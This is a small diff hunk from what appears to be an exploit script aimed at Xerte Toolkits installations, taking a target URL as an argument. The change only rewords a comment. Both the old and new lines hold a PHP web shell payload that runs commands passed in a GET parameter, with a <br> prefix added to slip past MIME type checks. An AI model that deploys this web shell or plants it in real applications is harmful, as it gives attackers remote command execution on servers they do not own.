@@ -86,7 +86,7 @@ def main():
         help = "Full URL to application. Ex: http://target.com/xertetoolkits")
     args = parser.parse_args()
 
-    payload = f"<br><?php system($_GET['cmd']); ?>" # To prevent mime type detection
+    payload = f"<br><?php system($_GET['cmd']); ?>" # <br> is to prevent mime type detection
 
     if args.webroot is None:
         webroot = get_webroot(url)
